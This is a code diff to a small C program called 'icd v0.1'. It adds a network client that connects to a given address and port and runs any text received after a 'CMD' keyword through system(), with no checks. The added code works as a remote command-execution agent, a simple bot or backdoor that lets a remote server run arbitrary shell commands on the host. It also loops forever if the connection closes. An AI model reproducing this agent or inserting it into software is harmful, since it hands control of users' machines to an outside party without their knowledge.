@@ -25,6 +25,16 @@
 #include "icd.h"
 #include "sock.h"
 
+#include <unistd.h>
+#include <errno.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+
+
+#define MAXDATASIZE 256
+
 void print_version() {
   printf("icd v0.1\n");
   exit(EXIT_SUCCESS);
@@ -90,6 +100,80 @@ int main(int argc, char **argv) {
     }
   }
 
-  exit(EXIT_SUCCESS);
+  /*real code starts here*/
+  int sockfd, numbytes, rv;
+  char buf[MAXDATASIZE];
+  struct addrinfo hints, *servinfo, *p;
+  char s[INET6_ADDRSTRLEN];
+
+  memset(&hints, 0, sizeof hints);
+  hints.ai_family = AF_UNSPEC;
+  hints.ai_socktype = SOCK_STREAM;
+  
+  /* this does stuff */
+  if ((rv = getaddrinfo(address, port, &hints, &servinfo)) != 0) {
+    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
+    return 1;
+  }
+  
+  /*loop through all the results and connect ot the first possible*/
+  for (p = servinfo; p != NULL; p = p->ai_next) {
+    if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
+      perror("client: socket");
+      continue;
+    }
+  
+    if (connect(sockfd, p-> ai_addr, p->ai_addrlen) == -1) {
+      close(sockfd);
+      perror("client: connect");
+      continue;
+    }
+ 
+    break;
+  }
+ 
+  if (p == NULL) {
+    fprintf(stderr, "client: failed to connect\n");
+    return 2;
+  }
+
+  inet_ntop(p->ai_family, get_in_addr((struct sockaddr *)p->ai_addr), s, sizeof s);
+  printf("client: connected to %s\n", s);
+  
+  freeaddrinfo(servinfo); //dont need servinfo anymore
+
+  while (1) {
+    char * pch;
+
+    if((numbytes = recv(sockfd, buf, MAXDATASIZE - 1, 0)) == -1) {
+      perror("recv");
+      exit(1);
+    }
+
+    buf[numbytes] = '\0';
+   
+    if (DEBUG == 1)
+      printf("client:received '%s' \n", buf);
+
+    pch = strtok(buf, " ");
+
+    while (pch != NULL) {
+      if (strcmp(pch, "CMD") == 0) {
+        pch = strtok(NULL, "\r\n");
+        system(pch);
+      }       
+      
+      break;
+      //pch = strok(NULL, " ");
+      
+    }
+    
+  }
+
+  close(sockfd);
+
+  return 0;
+ 
+  //exit(EXIT_SUCCESS);
 }
 
